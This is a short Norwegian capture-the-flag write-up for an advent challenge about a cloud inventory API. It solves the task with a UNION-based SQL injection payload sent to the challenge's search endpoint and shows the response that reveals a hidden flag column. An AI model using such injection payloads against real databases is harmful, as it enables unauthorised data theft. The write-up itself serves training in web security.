# Luke 5 - Digitalt varelager

```
NPST har digitalisert varelageret sitt og flyttet det til skyen! For øyeblikket er det fortsatt i oppstartsfasen og trenger litt kvalitetssjekking.

Har du mulighet til å se om Varelager v1 funker som det skal og at det ikke skjuler seg noen feil i systemet?

Varelageret finner du her, og bruk programmeringsgrensesnittnøkkel v1_pgmsqxmddz.

Mvh Mellomleder
```
link: https://varelager.p26e.dev/

---

## Løsning

SQL Injection. Det viser seg å være en postgressql database. En enkel join skal til for å vise en skjult kolenne i tabellen.

Denne kunne også løses uten SQL injection siden hele tabellen ble returnert til klient, bare ikke vist. Så flagget kan hentes ved å sjekke informasjonen mottatt under "Network" i Chrome developer tools.

For enklere debugging ved feil, brukte jeg postman istedenfor nettsiden noe som lot meg se feilmeldingene.

`POST` spørring til `https://varelager.p26e.dev/api/search`

### Request
```json
{
    "search":"spilleringenrolle' UNION (SELECT id, navn, antall, enhet, kommentar, flagg FROM v1.ting WHERE flagg IS NOT NULL ) ;--%;",
    "key":"v1_pgmsqxmddz"
}
```
### Response
```json
[
  {
    "id": "13b97062-dd26-41dc-bda0-58e4be6d1deb",
    "navn": "Ukjent vare",
    "antall": 1,
    "enhet": "stk",
    "kommentar": "🚩",
    "flagg": "PST{5Q1_1nj€Ⓒt10n}"
  }
]
```

---

## 🥚 Easter Egg 🥚

En enkel inspisering av kildekode så viser et easter egg seg.

![Egg skjembilde](.\egg_skjermbilde.png "Egg 🥚")